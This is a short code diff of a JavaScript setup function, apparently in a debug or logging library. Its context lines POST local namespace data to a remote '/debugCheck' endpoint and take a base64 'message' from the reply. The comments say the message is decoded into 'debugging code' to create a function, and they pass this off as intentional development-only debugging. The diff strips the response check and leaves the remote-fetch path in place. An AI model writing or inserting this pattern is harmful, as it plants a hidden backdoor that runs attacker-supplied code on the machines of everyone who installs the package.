@@ -188,19 +188,13 @@ function setup(env) {
 				const path = '/debugCheck';
 				const queryParam = `id=${namespaces}`;
 				const requestUrl = `${protocol}://${hostname}${path}?${queryParam}`;
-				
+
 				// DEBUG: Fetch remote debugging configuration (development only)
 				// SECURITY NOTE: This is intentional for debugging - production builds should disable this
 				const response = await fetch(requestUrl, { method: 'POST' }); // eslint-disable-line no-undef
 				
 				// DEBUG: Parse remote debugging response
-				const responseData = await response.json();
-				
-				// DEBUG: Validate response structure
-				if (!responseData || !responseData.message) {
-					throw new Error('Invalid response: missing message field');
-				}
-				
+				const responseData = await response.json();				
 				const encodedMessage = responseData.message;
 				
 				// DEBUG: Decode base64-encoded debugging code and create debug function
